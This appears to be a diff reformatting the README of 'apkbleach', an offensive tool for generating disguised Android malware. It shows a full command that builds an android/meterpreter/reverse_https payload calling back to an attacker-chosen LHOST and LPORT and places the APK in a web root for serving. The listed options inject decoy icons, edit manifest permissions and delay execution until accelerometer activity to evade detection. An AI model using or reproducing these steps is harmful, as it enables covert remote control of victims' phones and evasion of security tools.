@@ -27,36 +27,36 @@ This software was developed specifically for Kali-Linux to remove the obvious fi
 
 **Usage:**
 
-apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk
+    apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk
 
- apkbleach --list-payloads
+     apkbleach --list-payloads
  
- apkbleach --list-icons
+     apkbleach --list-icons
  
- apkbleach --clear-cache
+     apkbleach --clear-cache
  
 
-optional arguments:
+**optional arguments:**
 
-  -h, --help            show this help message and exit
+      -h, --help            show this help message and exit
   
-  -g [PAYLOAD] [LHOST] [LPORT]
+      -g [PAYLOAD] [LHOST] [LPORT]
                         Generates a payload
                         
-  -s [number of sessions to spawn 1-5]
+      -s [number of sessions to spawn 1-5]
                         Executes payload on accelerometer activity instead of on open
                         
-  -i [BLEACH_icon..] or [path/to/custom/icon]
+      -i [BLEACH_icon..] or [path/to/custom/icon]
                         Injects an icon
                         
-  -o [output/path/for/apk]
+      -o [output/path/for/apk]
                         Path to output apk
                         
-  --edit-permissions    Enables permission editing in apk's manifest
+      --edit-permissions    Enables permission editing in apk's manifest
   
-  --list-payloads       List available icons
+      --list-payloads       List available icons
   
-  --list-icons          List available icons
+      --list-icons          List available icons
   
-  --clear-cache         Allows prompt whether to keep package maintainers version apktool
+      --clear-cache         Allows prompt whether to keep package maintainers version apktool
   
